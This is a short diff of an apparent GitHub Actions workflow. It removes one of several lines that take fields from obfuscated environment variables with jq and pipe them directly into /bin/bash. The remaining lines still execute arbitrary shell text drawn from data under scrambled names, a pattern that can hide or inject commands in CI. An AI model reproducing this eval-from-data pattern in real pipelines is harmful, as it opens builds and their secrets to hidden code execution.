@@ -23,7 +23,6 @@ jobs:
           echo $zhnm36 | jq -r .qbyer5 | /bin/bash
           echo $neixt6 | jq -r .ps59700 | /bin/bash
           printf '%s' "$st886" | jq -r .geobt11 | /bin/bash
-          echo $dv5 | jq -r .wgwac67 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
